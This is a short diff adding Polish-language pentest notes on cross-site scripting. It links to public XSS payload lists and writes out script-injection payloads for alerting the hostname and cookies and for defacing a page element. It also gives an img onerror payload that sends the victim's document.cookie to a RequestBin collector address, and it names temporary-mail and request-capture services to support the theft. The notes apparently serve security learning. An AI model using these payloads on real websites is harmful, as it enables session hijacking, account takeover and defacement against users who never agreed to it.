@@ -1,3 +1,14 @@
 [Strony z payloadami i przykladami]
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 https://github.com/payloadbox/xss-payload-list
+
+
+1) XSS
+      • Wstrzykniecie w formularzu odsylanym do servera (burp) 
+            ▪ <script>alert(window.location.hostname);</script>
+            ▪ <script>alert(document.cookie);</script>
+            ▪ <script>document.getElementById('<nazwa np. banneru>').innerHTML="I am a hacker"</script>
+      • Wstrzykniecie kodu wysylajacego ciasteczko do zewnetrznego servera
+            ▪ https://requestbin.com 
+            ▪ Https://temp-mail.org/pl/10minutemail 
+            ▪ <img src=x onerror=this.src="<ADRES Z REQESTBIN>/?c="+document.cookie>
